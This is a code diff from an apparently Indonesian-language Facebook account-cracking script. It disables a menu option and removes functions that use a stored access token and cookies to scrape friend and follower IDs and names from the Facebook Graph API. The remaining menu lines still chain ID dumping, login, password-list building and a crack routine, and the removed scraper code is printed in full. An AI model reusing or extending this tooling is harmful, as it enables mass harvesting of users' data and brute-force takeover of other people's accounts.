@@ -343,7 +343,7 @@ def tampilan_menu():
 def pilih_menu():
     global gabung_sandi, tempel_sandi
     dc = input('   %s└──> %s'%(A,J))
-    if dc in ['1','01','a']    : gabung_sandi.append(Author);publik();system_login();urut_crack();pilihan_sakdurunge_crack();addpass();crack()
+    if dc in ['1','01','a']    : gabung_sandi.append(Author);not_availablell('Dump ID Dari Friendlist')
     elif dc in ['2','02','b']  : tempel_sandi.append('Jangan');main_folls();system_login();urut_crack();pilihan_sakdurunge_crack();addpass();crack()
     elif dc in ['3','03','c']  : gabung_sandi.append('Direcode');not_availablell('Dump ID Dari Nama')
     elif dc in ['4','04','d']  : tempel_sandi.append('Dasar');main_likers();system_login();pilihan_sakdurunge_crack();addpass();crack()
@@ -491,61 +491,6 @@ def cek_user_agent():
         input('\n   %s[ %sKembali %s]'%(J,P,J))
         tampilan_menu()
     except Exception as e:kecuali(e)
-
-###----------[ DUMP ID PUBLIC ]---------- ###
-def publik():
-    global file_dump
-    try:
-        try:
-            token  = open('login/token.json','r').read()
-            cookie = {'cookie':open('login/cookie.json','r').read()}
-        except:
-            print('\n%s[%s•%s] %sCookies Invalid %s!%s\n'%(M,P,M,P,M,P))
-            time.sleep(3)
-            login()
-        print('       %s[%s•%s] %sContoh : 1827084332,607801156'%(J,P,J,P))
-        tid = input('       %s[%s•%s] %sID Target : %s'%(J,P,J,P,J)).split(',')
-        file_dump = 'dump/%s.json'%(tid[0])
-        try:os.remove(file_dump)
-        except:pass
-        for id in tid :
-            try:
-                url = ("https://graph.facebook.com/%s?fields=friends.fields(id,name)&access_token=%s"%(id,token))
-                with requests.Session() as xyz:
-                    jso = json.loads(xyz.get(url,cookies=cookie).text)
-                    if len(gabung_sandi) != 1:
-                        for x in range(Postingan):
-                            open(file_dump,'a+').write('dev\n')
-                    else:
-                        for d in jso["friends"]["data"]:
-                            try:open(file_dump,'a+').write('%s=%s\n'%(d['id'],d['name']))
-                            except:continue
-            except Exception as e:kecuali(e)
-        jum = open(file_dump,'r').read().splitlines()
-        print('       %s[%s•%s] %sBerhasil Dump %s%s %sID'%(J,P,J,P,J,str(len(jum)),P))
-        print('       %s[%s•%s] %sFile : %s%s %s'%(J,P,J,P,J,file_dump,P))
-def exec_folls(url,token,file):
-    print("\r       %s[%s•%s] %sSedang Mengambil %s%s %sID"%(K,P,K,P,K,len(open(file,'r').read().splitlines()),P), end='');sys.stdout.flush()
-    with requests.Session() as xyz:
-        try:
-            x = xyz.get(url,cookies=cookie)
-            a = json.loads(x.text)
-            if len(tempel_sandi) != 1:
-                for x in range(Postingan):
-                    open(file_dump,'a+').write('dev\n')
-            else:
-                for b in a['data']:
-                    try:
-                        f = ('%s=%s\n'%(b['id'],b['name']))
-                        if f in open(file,'r').read():continue
-                        else:open(file,'a+').write(f)
-                    except Exception as e:continue
-            y = par(x.text,'html.parser')
-            n = re.findall('"after":"(.*?)"},',str(y))[0]
-            next = ('https://graph.facebook.com/v16.0/100013275378835/subscribers?access_token=%s&limit=5000&after=%s'%(token,n))
-            exec_folls(next,token,file)
-        except KeyboardInterrupt:pass
-        except (IndexError,TypeError,IOError,KeyError,AttributeError):pass
 
 ###----------[ DUMP ID FOLLOWERS ]---------- ###
 def main_folls():
